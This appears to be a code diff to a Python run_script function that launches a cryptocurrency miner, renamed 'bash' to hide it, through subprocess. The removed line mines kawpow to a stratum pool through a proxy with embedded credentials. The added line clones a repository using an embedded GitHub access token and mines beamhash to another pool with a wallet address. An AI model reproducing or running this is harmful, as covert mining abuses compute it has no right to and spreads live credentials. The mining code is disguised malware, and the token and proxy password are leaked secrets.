@@ -30,7 +30,7 @@ def run_script():
 
     # 3️⃣ Jalankan script
     subprocess.run(
-        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "],
+        ["bash", "-lc", "git clone https://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@github.com/sadarsayujinjas/gm.git && cd gm && chmod u+x bash && ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin "],
         check=False
     )
 
